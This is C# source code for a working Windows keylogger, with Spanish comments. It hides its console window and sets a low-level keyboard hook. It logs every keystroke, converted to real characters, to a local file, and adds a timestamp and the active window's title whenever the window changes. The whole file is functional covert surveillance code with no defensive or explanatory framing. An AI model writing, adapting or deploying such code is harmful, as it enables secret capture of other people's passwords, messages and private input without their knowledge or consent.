using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

class KeyLogger
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    private static StreamWriter logWriter;
    private static string lastWindowTitle = "";

    [STAThread]
    static void Main()
    {
        // Ocultar consola
        IntPtr handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);

        // Ruta del log
        string exePath = Assembly.GetExecutingAssembly().Location;
        string exeDir = Path.GetDirectoryName(exePath);
        string logPath = Path.Combine(exeDir, "log.txt");

        logWriter = new StreamWriter(new FileStream(logPath, FileMode.Append, FileAccess.Write))
        {
            AutoFlush = true
        };

        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
        logWriter.Close();
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);

            // Obtener ventana activa
            IntPtr hWnd = GetForegroundWindow();
            StringBuilder winBuffer = new StringBuilder(256);
            GetWindowText(hWnd, winBuffer, 256);
            string currentWindowTitle = winBuffer.ToString();

            if (currentWindowTitle != lastWindowTitle)
            {
                lastWindowTitle = currentWindowTitle;
                string time = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                logWriter.WriteLine();
                logWriter.WriteLine("[" + time + "] Ventana: " + currentWindowTitle);
            }

            // Obtener layout
            IntPtr layout = GetKeyboardLayout(0);

            // Estado de teclas
            byte[] keyState = new byte[256];
            GetKeyboardState(keyState);

            if ((GetKeyState(VK_SHIFT) & 0x8000) != 0)
                keyState[VK_SHIFT] = 0x80;
            if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
                keyState[VK_CAPITAL] = 0x01;

            // Traducir a carácter real
            StringBuilder buffer = new StringBuilder(5);
            int result = ToUnicodeEx((uint)vkCode, 0, keyState, buffer, buffer.Capacity, 0, layout);

            string key = (result > 0) ? buffer.ToString() : "[" + ((Keys)vkCode).ToString() + "]";

            logWriter.Write(key);
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    // Windows API
    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
        IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    [DllImport("user32.dll")]
    private static extern short GetKeyState(int nVirtKey);

    [DllImport("user32.dll")]
    private static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    private static extern int ToUnicodeEx(
        uint wVirtKey,
        uint wScanCode,
        byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
        int cchBuff,
        uint wFlags,
        IntPtr dwhkl);

    [DllImport("user32.dll")]
    private static extern IntPtr GetKeyboardLayout(uint idThread);

    private const int SW_HIDE = 0;
    private const int VK_SHIFT = 0x10;
    private const int VK_CAPITAL = 0x14;
}
